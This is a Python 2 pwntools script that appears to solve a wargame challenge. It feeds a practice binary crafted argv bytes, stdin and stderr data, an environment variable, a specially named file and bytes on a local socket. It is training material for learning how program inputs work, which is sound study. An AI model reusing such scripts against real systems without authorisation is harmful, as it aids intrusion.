#!/usr/bin/env python2

from pwn import *
import os, socket, time

context.log_level="debug"

def createPayload():
    payload = ["a"]
    for v0 in range(99):
        payload.append(" a")
    payload[ord("A")] = '\x00'
    payload[ord("B")] = '\x20\x0a\x0d'
    payload[ord("C")] = "22334"
    return payload 

def exploitation(payload):
    fileHandle = open("/tmp/dev4ndr3w/stderr", "w")
    fileHandle.write('\x00\x0a\x02\xff')
    fileHandle.close()

    environment = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}
    
    fileHandle = open("\x0a", "w")
    fileHandle.write('\x00\x00\x00\x00')
    fileHandle.close()

    processHandle = process(executable="/home/input2/input", argv=payload, stderr=open("/tmp/dev4ndr3w/stderr", "r"), env=environment)

    processHandle.sendline('\x00\x0a\x00\xff')
    socketHandle = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketHandle.connect(("0.0.0.0", 22334))

    socketHandle.send("\xde\xad\xbe\xef")

    socketHandle.close()
    print(processHandle.readall(timeout=4.0))

if __name__ == "__main__":
    payload = createPayload()
    print(len(payload))
    exploitation(payload)
